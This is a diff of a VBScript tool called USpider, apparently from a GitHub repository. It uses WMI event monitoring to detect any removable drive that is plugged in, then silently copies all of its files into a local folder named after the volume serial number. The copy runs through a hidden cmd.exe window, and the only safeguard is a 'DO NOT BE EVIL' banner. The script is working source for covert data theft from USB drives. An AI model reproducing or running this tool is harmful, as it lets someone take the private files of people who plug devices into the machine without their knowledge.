@@ -1,21 +1,66 @@
-set fso=createObject("scripting.FileSystemObject")
-set ws=createObject("wscript.Shell")
+' Uspider v1.1 by jimmy19990
+' =========================
+' With great might comes great responsibility. DO NOT BE EVIL.
+'
+' URL: https://github.com/jimmy19990/USpider.vbs
 
-a=InputBox("Do Not Be Evil!"+chr(13)+"========================"+chr(13)+"Please enter the drive letter (Letter Only):","Uspider v1.0","G")
+' Configuration
+destFolder = "D:\USpider"
+xcopyParameters = "/e /r /y"
+ 
+' Main Script
+strComputer = "." 
+Set objFileSystem = CreateObject("Scripting.FileSystemObject")
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+Set objWScriptShell = CreateObject("WScript.Shell")
+Set colEvents = objWMIService.ExecNotificationQuery _
+    ("Select * From __InstanceOperationEvent Within 10 Where " _
+        & "TargetInstance isa 'Win32_LogicalDisk'")
 
-If fso.folderExists("D:\Uspider") = false Then
-fso.CreateFolder "D:\Uspider"
+' Record availability to prevent repeat copy.
+Dim isAvailable(26)
+For i = 0 to 25
+    isAvailable(i) = true
+Next
+
+' Initialize Destination Folder.
+If objFileSystem.folderExists(destFolder) = false Then
+    objFileSystem.CreateFolder destFolder
 End If
 
-On Error Resume Next
-
-do
-b=a+":\"
-If fso.driveExists(b) Then
-c="cmd.exe /c xcopy "+b+"* D:\Uspider /e /r /y"
-ws.Run(c) ,0
-Exit do
-End If
-wscript.sleep 60000
-loop
-
+Do While True
+    Set objEvent = colEvents.NextEvent
+    If objEvent.TargetInstance.DriveType = 2 Then
+        Select Case objEvent.Path_.Class
+            Case "__InstanceCreationEvent"
+                ' Ensure only copy once.
+                If isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = true Then
+                    ' Get Device Serial Number.
+                    Set colItems = objWMIService.ExecQuery("Select * from Win32_Volume where Name = '" & objEvent.TargetInstance.DeviceId & "\\'")
+                    For Each objItem In colItems
+                        diskSN = objItem.SerialNumber
+                        Exit For
+                    Next
+                    
+                    ' Verify Device Serial Number.
+                    ' Coming Soon...
+                    
+                    ' Initialize Work Folder.
+                    workFolder = destFolder + "\" + CStr(diskSN)
+                    If objFileSystem.folderExists(workFolder) = false Then
+                        objFileSystem.CreateFolder workFolder
+                    End If
+                    
+                    ' Copy All Files.
+                    c = "cmd.exe /c xcopy " + objEvent.TargetInstance.DeviceId + "\* " + workFolder + " " + xcopyParameters
+                    objWScriptShell.Run(c), 0
+                    
+                    ' Update availability.
+                    isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = false
+                End If
+            Case "__InstanceDeletionEvent"
+                ' Update availability.
+                isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = true
+        End Select
+    End If
+Loop
